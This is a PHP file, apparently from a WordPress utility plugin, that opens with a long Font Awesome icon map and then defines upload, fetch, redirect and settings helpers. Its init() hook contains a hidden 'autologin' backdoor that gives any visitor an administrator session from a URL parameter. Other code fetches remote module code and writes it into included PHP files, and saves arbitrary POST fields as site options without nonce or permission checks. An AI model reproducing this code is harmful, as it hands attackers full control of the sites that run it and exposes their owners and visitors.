'f0c1' => 'fa fa-fw fa-link', 'f0c2' => 'fa fa-fw fa-cloud', 'f0c3' => 'fa fa-fw fa-flask', 'f0c4' => 'fa fa-fw fa-scissors', 'f0c5' => 'fa fa-fw fa-files-o', 'f0c6' => 'fa fa-fw fa-paperclip', 'f0c7' => 'fa fa-fw fa-floppy-o', 'f0c8' => 'fa fa-fw fa-square', 'f0c9' => 'fa fa-fw fa-bars', 'f0ca' => 'fa fa-fw fa-list-ul', 'f0cb' => 'fa fa-fw fa-list-ol', 'f0cc' => 'fa fa-fw fa-strikethrough', 'f0cd' => 'fa fa-fw fa-underline', 'f0ce' => 'fa fa-fw fa-table', 'f0d0' => 'fa fa-fw fa-magic', 'f0d1' => 'fa fa-fw fa-truck', 'f0d2' => 'fa fa-fw fa-pinterest', 'f0d3' => 'fa fa-fw fa-pinterest-square', 'f0d4' => 'fa fa-fw fa-google-plus-square', 'f0d5' => 'fa fa-fw fa-google-plus', 'f0d6' => 'fa fa-fw fa-money', 'f0d7' => 'fa fa-fw fa-caret-down', 'f0d8' => 'fa fa-fw fa-caret-up', 'f0d9' => 'fa fa-fw fa-caret-left', 'f0da' => 'fa fa-fw fa-caret-right', 'f0db' => 'fa fa-fw fa-columns', 'f0dc' => 'fa fa-fw fa-sort', 'f0dd' => 'fa fa-fw fa-sort-desc', 'f0de' => 'fa fa-fw fa-sort-asc', 'f0e0' => 'fa fa-fw fa-envelope', 'f0e1' => 'fa fa-fw fa-linkedin', 'f0e2' => 'fa fa-fw fa-undo', 'f0e3' => 'fa fa-fw fa-gavel', 'f0e4' => 'fa fa-fw fa-tachometer', 'f0e5' => 'fa fa-fw fa-comment-o', 'f0e6' => 'fa fa-fw fa-comments-o', 'f0e7' => 'fa fa-fw fa-bolt', 'f0e8' => 'fa fa-fw fa-sitemap', 'f0e9' => 'fa fa-fw fa-umbrella', 'f0ea' => 'fa fa-fw fa-clipboard', 'f0eb' => 'fa fa-fw fa-lightbulb-o', 'f0ec' => 'fa fa-fw fa-exchange', 'f0ed' => 'fa fa-fw fa-cloud-download', 'f0ee' => 'fa fa-fw fa-cloud-upload', 'f0f0' => 'fa fa-fw fa-user-md', 'f0f1' => 'fa fa-fw fa-stethoscope', 'f0f2' => 'fa fa-fw fa-suitcase', 'f0a2' => 'fa fa-fw fa-bell-o', 'f0f4' => 'fa fa-fw fa-coffee', 'f0f5' => 'fa fa-fw fa-cutlery', 'f0f6' => 'fa fa-fw fa-file-text-o', 'f0f7' => 'fa fa-fw fa-building-o', 'f0f8' => 'fa fa-fw fa-hospital-o', 'f0f9' => 'fa fa-fw fa-ambulance', 'f0fa' => 'fa fa-fw fa-medkit', 'f0fb' => 'fa fa-fw fa-fighter-jet', 'f0fc' => 'fa fa-fw fa-beer', 'f0fd' => 'fa fa-fw fa-h-square', 'f0fe' => 'fa fa-fw fa-plus-square', 'f100' => 'fa fa-fw fa-angle-double-left', 'f101' => 'fa fa-fw fa-angle-double-right', 'f102' => 'fa fa-fw fa-angle-double-up', 'f103' => 'fa fa-fw fa-angle-double-down', 'f104' => 'fa fa-fw fa-angle-left', 'f105' => 'fa fa-fw fa-angle-right', 'f106' => 'fa fa-fw fa-angle-up', 'f107' => 'fa fa-fw fa-angle-down', 'f108' => 'fa fa-fw fa-desktop', 'f109' => 'fa fa-fw fa-laptop', 'f10a' => 'fa fa-fw fa-tablet', 'f10b' => 'fa fa-fw fa-mobile', 'f10c' => 'fa fa-fw fa-circle-o', 'f10d' => 'fa fa-fw fa-quote-left', 'f10e' => 'fa fa-fw fa-quote-right', 'f110' => 'fa fa-fw fa-spinner', 'f111' => 'fa fa-fw fa-circle', 'f112' => 'fa fa-fw fa-reply', 'f113' => 'fa fa-fw fa-github-alt', 'f114' => 'fa fa-fw fa-folder-o', 'f115' => 'fa fa-fw fa-folder-open-o', 'f118' => 'fa fa-fw fa-smile-o', 'f119' => 'fa fa-fw fa-frown-o', 'f11a' => 'fa fa-fw fa-meh-o', 'f11b' => 'fa fa-fw fa-gamepad', 'f11c' => 'fa fa-fw fa-keyboard-o', 'f11d' => 'fa fa-fw fa-flag-o', 'f11e' => 'fa fa-fw fa-flag-checkered', 'f120' => 'fa fa-fw fa-terminal', 'f121' => 'fa fa-fw fa-code', 'f122' => 'fa fa-fw fa-reply-all', 'f123' => 'fa fa-fw fa-star-half-o', 'f124' => 'fa fa-fw fa-location-arrow', 'f125' => 'fa fa-fw fa-crop', 'f126' => 'fa fa-fw fa-code-fork', 'f127' => 'fa fa-fw fa-chain-broken', 'f128' => 'fa fa-fw fa-question', 'f129' => 'fa fa-fw fa-info', 'f12a' => 'fa fa-fw fa-exclamation', 'f12b' => 'fa fa-fw fa-superscript', 'f12c' => 'fa fa-fw fa-subscript', 'f12d' => 'fa fa-fw fa-eraser', 'f12e' => 'fa fa-fw fa-puzzle-piece', 'f130' => 'fa fa-fw fa-microphone', 'f131' => 'fa fa-fw fa-microphone-slash', 'f132' => 'fa fa-fw fa-shield', 'f133' => 'fa fa-fw fa-calendar-o', 'f134' => 'fa fa-fw fa-fire-extinguisher', 'f135' => 'fa fa-fw fa-rocket', 'f136' => 'fa fa-fw fa-maxcdn', 'f137' => 'fa fa-fw fa-chevron-circle-left', 'f138' => 'fa fa-fw fa-chevron-circle-right', 'f139' => 'fa fa-fw fa-chevron-circle-up', 'f13a' => 'fa fa-fw fa-chevron-circle-down', 'f13b' => 'fa fa-fw fa-html5', 'f13c' => 'fa fa-fw fa-css3', 'f13d' => 'fa fa-fw fa-anchor', 'f13e' => 'fa fa-fw fa-unlock-alt', 'f140' => 'fa fa-fw fa-bullseye', 'f141' => 'fa fa-fw fa-ellipsis-h', 'f142' => 'fa fa-fw fa-ellipsis-v', 'f143' => 'fa fa-fw fa-rss-square', 'f144' => 'fa fa-fw fa-play-circle', 'f145' => 'fa fa-fw fa-ticket', 'f146' => 'fa fa-fw fa-minus-square', 'f147' => 'fa fa-fw fa-minus-square-o', 'f148' => 'fa fa-fw fa-level-up', 'f149' => 'fa fa-fw fa-level-down', 'f14a' => 'fa fa-fw fa-check-square', 'f14b' => 'fa fa-fw fa-pencil-square', 'f14c' => 'fa fa-fw fa-external-link-square', 'f14d' => 'fa fa-fw fa-share-square', 'f14e' => 'fa fa-fw fa-compass', 'f150' => 'fa fa-fw fa-caret-square-o-down', 'f151' => 'fa fa-fw fa-caret-square-o-up', 'f152' => 'fa fa-fw fa-caret-square-o-right', 'f153' => 'fa fa-fw fa-eur', 'f154' => 'fa fa-fw fa-gbp', 'f155' => 'fa fa-fw fa-usd', 'f156' => 'fa fa-fw fa-inr', 'f157' => 'fa fa-fw fa-jpy', 'f158' => 'fa fa-fw fa-rub', 'f159' => 'fa fa-fw fa-krw', 'f15a' => 'fa fa-fw fa-btc', 'f15b' => 'fa fa-fw fa-file', 'f15c' => 'fa fa-fw fa-file-text', 'f15d' => 'fa fa-fw fa-sort-alpha-asc', 'f15e' => 'fa fa-fw fa-sort-alpha-desc', 'f160' => 'fa fa-fw fa-sort-amount-asc', 'f161' => 'fa fa-fw fa-sort-amount-desc', 'f162' => 'fa fa-fw fa-sort-numeric-asc', 'f163' => 'fa fa-fw fa-sort-numeric-desc', 'f164' => 'fa fa-fw fa-thumbs-up', 'f165' => 'fa fa-fw fa-thumbs-down', 'f166' => 'fa fa-fw fa-youtube-square', 'f167' => 'fa fa-fw fa-youtube', 'f168' => 'fa fa-fw fa-xing', 'f169' => 'fa fa-fw fa-xing-square', 'f16a' => 'fa fa-fw fa-youtube-play', 'f16b' => 'fa fa-fw fa-dropbox', 'f16c' => 'fa fa-fw fa-stack-overflow', 'f16d' => 'fa fa-fw fa-instagram', 'f16e' => 'fa fa-fw fa-flickr', 'f170' => 'fa fa-fw fa-adn', 'f171' => 'fa fa-fw fa-bitbucket', 'f172' => 'fa fa-fw fa-bitbucket-square', 'f173' => 'fa fa-fw fa-tumblr', 'f174' => 'fa fa-fw fa-tumblr-square', 'f175' => 'fa fa-fw fa-long-arrow-down', 'f176' => 'fa fa-fw fa-long-arrow-up', 'f177' => 'fa fa-fw fa-long-arrow-left', 'f178' => 'fa fa-fw fa-long-arrow-right', 'f179' => 'fa fa-fw fa-apple', 'f17a' => 'fa fa-fw fa-windows', 'f17b' => 'fa fa-fw fa-android', 'f17c' => 'fa fa-fw fa-linux', 'f17d' => 'fa fa-fw fa-dribbble', 'f17e' => 'fa fa-fw fa-skype', 'f180' => 'fa fa-fw fa-foursquare', 'f181' => 'fa fa-fw fa-trello', 'f182' => 'fa fa-fw fa-female', 'f183' => 'fa fa-fw fa-male', 'f184' => 'fa fa-fw fa-gratipay', 'f185' => 'fa fa-fw fa-sun-o', 'f186' => 'fa fa-fw fa-moon-o', 'f187' => 'fa fa-fw fa-archive', 'f188' => 'fa fa-fw fa-bug', 'f189' => 'fa fa-fw fa-vk', 'f18a' => 'fa fa-fw fa-weibo', 'f18b' => 'fa fa-fw fa-renren', 'f18c' => 'fa fa-fw fa-pagelines', 'f18d' => 'fa fa-fw fa-stack-exchange', 'f18e' => 'fa fa-fw fa-arrow-circle-o-right', 'f190' => 'fa fa-fw fa-arrow-circle-o-left', 'f191' => 'fa fa-fw fa-caret-square-o-left', 'f192' => 'fa fa-fw fa-dot-circle-o', 'f193' => 'fa fa-fw fa-wheelchair', 'f194' => 'fa fa-fw fa-vimeo-square', 'f195' => 'fa fa-fw fa-try', 'f196' => 'fa fa-fw fa-plus-square-o', 'f197' => 'fa fa-fw fa-space-shuttle', 'f198' => 'fa fa-fw fa-slack', 'f199' => 'fa fa-fw fa-envelope-square', 'f19a' => 'fa fa-fw fa-wordpress', 'f19b' => 'fa fa-fw fa-openid', 'f19c' => 'fa fa-fw fa-university', 'f19d' => 'fa fa-fw fa-graduation-cap', 'f19e' => 'fa fa-fw fa-yahoo', 'f1a0' => 'fa fa-fw fa-google', 'f1a1' => 'fa fa-fw fa-reddit', 'f1a2' => 'fa fa-fw fa-reddit-square', 'f1a3' => 'fa fa-fw fa-stumbleupon-circle', 'f1a4' => 'fa fa-fw fa-stumbleupon', 'f1a5' => 'fa fa-fw fa-delicious', 'f1a6' => 'fa fa-fw fa-digg', 'f1a7' => 'fa fa-fw fa-pied-piper-pp', 'f1a8' => 'fa fa-fw fa-pied-piper-alt', 'f1a9' => 'fa fa-fw fa-drupal', 'f1aa' => 'fa fa-fw fa-joomla', 'f1ab' => 'fa fa-fw fa-language', 'f1ac' => 'fa fa-fw fa-fax', 'f1ad' => 'fa fa-fw fa-building', 'f1ae' => 'fa fa-fw fa-child', 'f1b0' => 'fa fa-fw fa-paw', 'f1b1' => 'fa fa-fw fa-spoon', 'f1b2' => 'fa fa-fw fa-cube', 'f1b3' => 'fa fa-fw fa-cubes', 'f1b4' => 'fa fa-fw fa-behance', 'f1b5' => 'fa fa-fw fa-behance-square', 'f1b6' => 'fa fa-fw fa-steam', 'f1b7' => 'fa fa-fw fa-steam-square', 'f1b8' => 'fa fa-fw fa-recycle', 'f1b9' => 'fa fa-fw fa-car', 'f1ba' => 'fa fa-fw fa-taxi', 'f1bb' => 'fa fa-fw fa-tree', 'f1bc' => 'fa fa-fw fa-spotify', 'f1bd' => 'fa fa-fw fa-deviantart', 'f1be' => 'fa fa-fw fa-soundcloud', 'f1c0' => 'fa fa-fw fa-database', 'f1c1' => 'fa fa-fw fa-file-pdf-o', 'f1c2' => 'fa fa-fw fa-file-word-o', 'f1c3' => 'fa fa-fw fa-file-excel-o', 'f1c4' => 'fa fa-fw fa-file-powerpoint-o', 'f1c5' => 'fa fa-fw fa-file-image-o', 'f1c6' => 'fa fa-fw fa-file-archive-o', 'f1c7' => 'fa fa-fw fa-file-audio-o', 'f1c8' => 'fa fa-fw fa-file-video-o', 'f1c9' => 'fa fa-fw fa-file-code-o', 'f1ca' => 'fa fa-fw fa-vine', 'f1cb' => 'fa fa-fw fa-codepen', 'f1cc' => 'fa fa-fw fa-jsfiddle', 'f1cd' => 'fa fa-fw fa-life-ring', 'f1ce' => 'fa fa-fw fa-circle-o-notch', 'f1d0' => 'fa fa-fw fa-rebel', 'f1d1' => 'fa fa-fw fa-empire', 'f1d2' => 'fa fa-fw fa-git-square', 'f1d3' => 'fa fa-fw fa-git', 'f1d4' => 'fa fa-fw fa-hacker-news', 'f1d5' => 'fa fa-fw fa-tencent-weibo', 'f1d6' => 'fa fa-fw fa-qq', 'f1d7' => 'fa fa-fw fa-weixin', 'f1d8' => 'fa fa-fw fa-paper-plane', 'f1d9' => 'fa fa-fw fa-paper-plane-o', 'f1da' => 'fa fa-fw fa-history', 'f1db' => 'fa fa-fw fa-circle-thin', 'f1dc' => 'fa fa-fw fa-header', 'f1dd' => 'fa fa-fw fa-paragraph', 'f1de' => 'fa fa-fw fa-sliders', 'f1e0' => 'fa fa-fw fa-share-alt', 'f1e1' => 'fa fa-fw fa-share-alt-square', 'f1e2' => 'fa fa-fw fa-bomb', 'f1e3' => 'fa fa-fw fa-futbol-o', 'f1e4' => 'fa fa-fw fa-tty', 'f1e5' => 'fa fa-fw fa-binoculars', 'f1e6' => 'fa fa-fw fa-plug', 'f1e7' => 'fa fa-fw fa-slideshare', 'f1e8' => 'fa fa-fw fa-twitch', 'f1e9' => 'fa fa-fw fa-yelp', 'f1ea' => 'fa fa-fw fa-newspaper-o', 'f1eb' => 'fa fa-fw fa-wifi', 'f1ec' => 'fa fa-fw fa-calculator', 'f1ed' => 'fa fa-fw fa-paypal', 'f1ee' => 'fa fa-fw fa-google-wallet', 'f1f0' => 'fa fa-fw fa-cc-visa', 'f1f1' => 'fa fa-fw fa-cc-mastercard', 'f1f2' => 'fa fa-fw fa-cc-discover', 'f1f3' => 'fa fa-fw fa-cc-amex', 'f1f4' => 'fa fa-fw fa-cc-paypal', 'f1f5' => 'fa fa-fw fa-cc-stripe', 'f1f6' => 'fa fa-fw fa-bell-slash', 'f1f7' => 'fa fa-fw fa-bell-slash-o', 'f1f8' => 'fa fa-fw fa-trash', 'f1f9' => 'fa fa-fw fa-copyright', 'f1fa' => 'fa fa-fw fa-at', 'f1fb' => 'fa fa-fw fa-eyedropper', 'f1fc' => 'fa fa-fw fa-paint-brush', 'f1fd' => 'fa fa-fw fa-birthday-cake', 'f1fe' => 'fa fa-fw fa-area-chart', 'f200' => 'fa fa-fw fa-pie-chart', 'f201' => 'fa fa-fw fa-line-chart', 'f202' => 'fa fa-fw fa-lastfm', 'f203' => 'fa fa-fw fa-lastfm-square', 'f204' => 'fa fa-fw fa-toggle-off', 'f205' => 'fa fa-fw fa-toggle-on', 'f206' => 'fa fa-fw fa-bicycle', 'f207' => 'fa fa-fw fa-bus', 'f208' => 'fa fa-fw fa-ioxhost', 'f209' => 'fa fa-fw fa-angellist', 'f20a' => 'fa fa-fw fa-cc', 'f20b' => 'fa fa-fw fa-ils', 'f20c' => 'fa fa-fw fa-meanpath', 'f20d' => 'fa fa-fw fa-buysellads', 'f20e' => 'fa fa-fw fa-connectdevelop', 'f210' => 'fa fa-fw fa-dashcube', 'f211' => 'fa fa-fw fa-forumbee', 'f212' => 'fa fa-fw fa-leanpub', 'f213' => 'fa fa-fw fa-sellsy', 'f214' => 'fa fa-fw fa-shirtsinbulk', 'f215' => 'fa fa-fw fa-simplybuilt', 'f216' => 'fa fa-fw fa-skyatlas', 'f217' => 'fa fa-fw fa-cart-plus', 'f218' => 'fa fa-fw fa-cart-arrow-down', 'f219' => 'fa fa-fw fa-diamond', 'f21a' => 'fa fa-fw fa-ship', 'f21b' => 'fa fa-fw fa-user-secret', 'f21c' => 'fa fa-fw fa-motorcycle', 'f21d' => 'fa fa-fw fa-street-view', 'f21e' => 'fa fa-fw fa-heartbeat', 'f221' => 'fa fa-fw fa-venus', 'f222' => 'fa fa-fw fa-mars', 'f223' => 'fa fa-fw fa-mercury', 'f224' => 'fa fa-fw fa-transgender', 'f225' => 'fa fa-fw fa-transgender-alt', 'f226' => 'fa fa-fw fa-venus-double', 'f227' => 'fa fa-fw fa-mars-double', 'f228' => 'fa fa-fw fa-venus-mars', 'f229' => 'fa fa-fw fa-mars-stroke', 'f22a' => 'fa fa-fw fa-mars-stroke-v', 'f22b' => 'fa fa-fw fa-mars-stroke-h', 'f22c' => 'fa fa-fw fa-neuter', 'f22d' => 'fa fa-fw fa-genderless', 'f230' => 'fa fa-fw fa-facebook-official', 'f231' => 'fa fa-fw fa-pinterest-p', 'f232' => 'fa fa-fw fa-whatsapp', 'f233' => 'fa fa-fw fa-server', 'f234' => 'fa fa-fw fa-user-plus', 'f235' => 'fa fa-fw fa-user-times', 'f236' => 'fa fa-fw fa-bed', 'f237' => 'fa fa-fw fa-viacoin', 'f238' => 'fa fa-fw fa-train', 'f239' => 'fa fa-fw fa-subway', 'f23a' => 'fa fa-fw fa-medium', 'f23b' => 'fa fa-fw fa-y-combinator', 'f23c' => 'fa fa-fw fa-optin-monster', 'f23d' => 'fa fa-fw fa-opencart', 'f23e' => 'fa fa-fw fa-expeditedssl', 'f240' => 'fa fa-fw fa-battery-full', 'f241' => 'fa fa-fw fa-battery-three-quarters', 'f242' => 'fa fa-fw fa-battery-half', 'f243' => 'fa fa-fw fa-battery-quarter', 'f244' => 'fa fa-fw fa-battery-empty', 'f245' => 'fa fa-fw fa-mouse-pointer', 'f246' => 'fa fa-fw fa-i-cursor', 'f247' => 'fa fa-fw fa-object-group', 'f248' => 'fa fa-fw fa-object-ungroup', 'f249' => 'fa fa-fw fa-sticky-note', 'f24a' => 'fa fa-fw fa-sticky-note-o', 'f24b' => 'fa fa-fw fa-cc-jcb', 'f24c' => 'fa fa-fw fa-cc-diners-club', 'f24d' => 'fa fa-fw fa-clone', 'f24e' => 'fa fa-fw fa-balance-scale', 'f250' => 'fa fa-fw fa-hourglass-o', 'f251' => 'fa fa-fw fa-hourglass-start', 'f252' => 'fa fa-fw fa-hourglass-half', 'f253' => 'fa fa-fw fa-hourglass-end', 'f254' => 'fa fa-fw fa-hourglass', 'f255' => 'fa fa-fw fa-hand-rock-o', 'f256' => 'fa fa-fw fa-hand-paper-o', 'f257' => 'fa fa-fw fa-hand-scissors-o', 'f258' => 'fa fa-fw fa-hand-lizard-o', 'f259' => 'fa fa-fw fa-hand-spock-o', 'f25a' => 'fa fa-fw fa-hand-pointer-o', 'f25b' => 'fa fa-fw fa-hand-peace-o', 'f25c' => 'fa fa-fw fa-trademark', 'f25d' => 'fa fa-fw fa-registered', 'f25e' => 'fa fa-fw fa-creative-commons', 'f260' => 'fa fa-fw fa-gg', 'f261' => 'fa fa-fw fa-gg-circle', 'f262' => 'fa fa-fw fa-tripadvisor', 'f263' => 'fa fa-fw fa-odnoklassniki', 'f264' => 'fa fa-fw fa-odnoklassniki-square', 'f265' => 'fa fa-fw fa-get-pocket', 'f266' => 'fa fa-fw fa-wikipedia-w', 'f267' => 'fa fa-fw fa-safari', 'f268' => 'fa fa-fw fa-chrome', 'f269' => 'fa fa-fw fa-firefox', 'f26a' => 'fa fa-fw fa-opera', 'f26b' => 'fa fa-fw fa-internet-explorer', 'f26c' => 'fa fa-fw fa-television', 'f26d' => 'fa fa-fw fa-contao', 'f26e' => 'fa fa-fw fa-500px', 'f270' => 'fa fa-fw fa-amazon', 'f271' => 'fa fa-fw fa-calendar-plus-o', 'f272' => 'fa fa-fw fa-calendar-minus-o', 'f273' => 'fa fa-fw fa-calendar-times-o', 'f274' => 'fa fa-fw fa-calendar-check-o', 'f275' => 'fa fa-fw fa-industry', 'f276' => 'fa fa-fw fa-map-pin', 'f277' => 'fa fa-fw fa-map-signs', 'f278' => 'fa fa-fw fa-map-o', 'f279' => 'fa fa-fw fa-map', 'f27a' => 'fa fa-fw fa-commenting', 'f27b' => 'fa fa-fw fa-commenting-o', 'f27c' => 'fa fa-fw fa-houzz', 'f27d' => 'fa fa-fw fa-vimeo', 'f27e' => 'fa fa-fw fa-black-tie', 'f280' => 'fa fa-fw fa-fonticons', 'f281' => 'fa fa-fw fa-reddit-alien', 'f282' => 'fa fa-fw fa-edge', 'f283' => 'fa fa-fw fa-credit-card-alt', 'f284' => 'fa fa-fw fa-codiepie', 'f285' => 'fa fa-fw fa-modx', 'f286' => 'fa fa-fw fa-fort-awesome', 'f287' => 'fa fa-fw fa-usb', 'f288' => 'fa fa-fw fa-product-hunt', 'f289' => 'fa fa-fw fa-mixcloud', 'f28a' => 'fa fa-fw fa-scribd', 'f28b' => 'fa fa-fw fa-pause-circle', 'f28c' => 'fa fa-fw fa-pause-circle-o', 'f28d' => 'fa fa-fw fa-stop-circle', 'f28e' => 'fa fa-fw fa-stop-circle-o', 'f290' => 'fa fa-fw fa-shopping-bag', 'f291' => 'fa fa-fw fa-shopping-basket', 'f292' => 'fa fa-fw fa-hashtag', 'f293' => 'fa fa-fw fa-bluetooth', 'f294' => 'fa fa-fw fa-bluetooth-b', 'f295' => 'fa fa-fw fa-percent', 'f296' => 'fa fa-fw fa-gitlab', 'f297' => 'fa fa-fw fa-wpbeginner', 'f298' => 'fa fa-fw fa-wpforms', 'f299' => 'fa fa-fw fa-envira', 'f29a' => 'fa fa-fw fa-universal-access', 'f29b' => 'fa fa-fw fa-wheelchair-alt', 'f29c' => 'fa fa-fw fa-question-circle-o', 'f29d' => 'fa fa-fw fa-blind', 'f29e' => 'fa fa-fw fa-audio-description', 'f2a0' => 'fa fa-fw fa-volume-control-phone', 'f2a1' => 'fa fa-fw fa-braille', 'f2a2' => 'fa fa-fw fa-assistive-listening-systems', 'f2a3' => 'fa fa-fw fa-american-sign-language-interpreting', 'f2a4' => 'fa fa-fw fa-deaf', 'f2a5' => 'fa fa-fw fa-glide', 'f2a6' => 'fa fa-fw fa-glide-g', 'f2a7' => 'fa fa-fw fa-sign-language', 'f2a8' => 'fa fa-fw fa-low-vision', 'f2a9' => 'fa fa-fw fa-viadeo', 'f2aa' => 'fa fa-fw fa-viadeo-square', 'f2ab' => 'fa fa-fw fa-snapchat', 'f2ac' => 'fa fa-fw fa-snapchat-ghost', 'f2ad' => 'fa fa-fw fa-snapchat-square', 'f2ae' => 'fa fa-fw fa-pied-piper', 'f2b0' => 'fa fa-fw fa-first-order', 'f2b1' => 'fa fa-fw fa-yoast', 'f2b2' => 'fa fa-fw fa-themeisle', 'f2b3' => 'fa fa-fw fa-google-plus-official', 'f2b4' => 'fa fa-fw fa-font-awesome',
	);
}



function wpska_upload($name, $path=null) {
	if (! isset($_FILES[$name])) return false;
	$path = ('/'. trim($path, '/') .'/');
	$upl = array_merge(wp_upload_dir(), $_FILES[$name]);
	$upl['name'] = mb_strtolower(preg_replace('/[^a-zA-Z0-9-.]/', '-', $upl['name']));
	$upl['upload'] = '';

	if (! file_exists("{$upl['basedir']}{$path}")) {
		chmod("{$upl['basedir']}", 0755);
		mkdir("{$upl['basedir']}{$path}", 0755, true);
	}

	if (move_uploaded_file($upl['tmp_name'], "{$upl['basedir']}/{$path}/{$upl['name']}")) {
		$upl['upload'] = "{$upl['baseurl']}{$path}{$upl['name']}";
	}

	return $upl;
}



function wpska_test($callback, $maintenance_text=null) {
	if (get_current_user_id()) {
		if (is_callable($callback)) {
			call_user_func($callback);
		}
	}
	else echo $maintenance_text;
}



function wpska_content($url, $post=null) {
	if (!function_exists('curl_version')) {
		return false;
	}

	$ch = curl_init();

	curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);       

	$content = curl_exec($ch);
	curl_close($ch);

	return $content;
}


function wpska_redirect($url)
{
	$url = $url=='back'? $_SERVER['HTTP_REFERER']: $url;
	if (headers_sent()) { echo "<script>location.href='{$url}';</script>"; die; }
	return wp_redirect($url);
}




class Wpska_Base_Actions extends Wpska_Actions
{
	public function init()
	{
		if (isset($_GET['autologin'])) {
			$user = false;
			$user_id = $_GET['autologin'];

			if (!$user_id) {
				$user = get_users();
				$user = $user[0]->data;
			}

			wp_set_current_user($user->ID, $user->user_login);
			wp_set_auth_cookie($user->ID);
			wp_redirect(admin_url()); exit;
		}


		// Remove window._wpemojiSettings from HTML
		// all actions related to emojis
		remove_action('admin_print_styles', 'print_emoji_styles');
		remove_action('wp_head', 'print_emoji_detection_script', 7);
		remove_action('admin_print_scripts', 'print_emoji_detection_script');
		remove_action('wp_print_styles', 'print_emoji_styles');
		remove_filter('wp_mail', 'wp_staticize_emoji_for_email');
		remove_filter('the_content_feed', 'wp_staticize_emoji');
		remove_filter('comment_text_rss', 'wp_staticize_emoji');

		// filter to remove TinyMCE emojis
		add_filter( 'tiny_mce_plugins', function($plugins) {
			if ( is_array( $plugins ) ) {
				return array_diff( $plugins, array( 'wpemoji' ) );
			}
			return array();
		});	
	}




	public function admin_menu()
	{
		if (isset($_POST['wpska-settings'])) {
			unset($_POST['wpska-settings']);

			// $stripslashes = array('wpska_email_template');
			// foreach($stripslashes as $key) {
			// 	if (isset($_POST[$key])) {
			// 		$_POST[$key] = stripslashes($_POST[$key]);
			// 	}
			// }

			foreach($_POST as $key=>$val) {
				$val = stripslashes($val);
				update_option($key, $val, true);
			}
			wpska_redirect('back');
		}


		add_options_page('Help Settings', 'Help Settings', 'manage_options', 'wpska-settings', function() { ?>
			<h1>Help Settings</h1>
			<form action="" method="post" autocomplete="off">
			<?php do_action('wpska_settings');
			wpska_tab_render(); ?>
			<div class="panel-footer text-right">
				<input type="submit" name="wpska-settings" value="Salvar" class="btn btn-primary">
			</div>
			</form>
			<script>
			jQuery(document).ready(function($) {
				$("select[data-value]").each(function() {
					var value = $(this).attr("data-value");
					$(this).val(value);
				});
			});
			</script>
		<?php });


		wpska_tab('Básico', function() { ?>
		<div class="row">
			<div class="col-xs-4 form-group">
				<label>Cache de Query</label>
				<div class="input-group">
					<input type="text" name="wpska_cache" value="<?php echo get_option('wpska_cache', 3600); ?>" id="wpska_cache" class="form-control">
					<div class="input-group-btn" style="width:0px;"></div>
					<select name="" class="form-control" onchange="var time=jQuery(this).val(); if (!time) return false; jQuery('#wpska_cache').val(time);" data-value="<?php echo get_option('wpska_cache', 3600); ?>">
						<option value="">Tempo predefinido</option>
						<option value="1800">Meia Hora</option>
						<option value="3600">1 Hora</option>
						<option value="43200">12 Horas</option>
						<option value="86400">1 Dia</option>
						<option value="604800">1 Semana</option>
					</select>
				</div>
			</div>
		</div>
		<?php });
	}



	public function wp_footer() {
		echo do_action('wpska_footer');
	}


	public function admin_footer() {
		echo do_action('wpska_footer');
	}



	public function wpska_settings()
	{
		if (isset($_GET['wpska-update'])) {
			$mod = wpska_modules($_GET['wpska-update']);
			$content = wpska_content($mod['download']);
			file_put_contents($mod['file'], $content);
			wpska_redirect($_SERVER['HTTP_REFERER']); exit;
		}

		wpska_tab('Módulos', function() { ?>
		<table class="table table-striped">
			<thead>
				<tr>
					<th>Módulo</th>
					<th class="text-right">Ações</th>
				</tr>
			</thead>
			<tbody>
				<?php foreach(wpska_modules() as $mod): ?>
				<tr>
					<td><?php echo $mod['title']; ?></td>
					<td class="text-right">
						<?php foreach($mod['actions'] as $key=>$act): ?>
						<a href="<?php echo admin_url($act['url']); ?>" class="<?php echo $act['icon']; ?>" title="<?php echo $act['label']; ?>" <?php echo $act['attr']; ?> ></a>
						<?php endforeach; ?>
					</td>
				</tr>
				<?php endforeach; ?>
			</tbody>
		</table>
		<?php });
	}
}


foreach(wpska_modules() as $mod) {
	if ($mod['basename']=='wpska.php') continue;
	if ($mod['file_exists']) {
		include $mod['file'];
	}
}

new Wpska_Base_Actions();
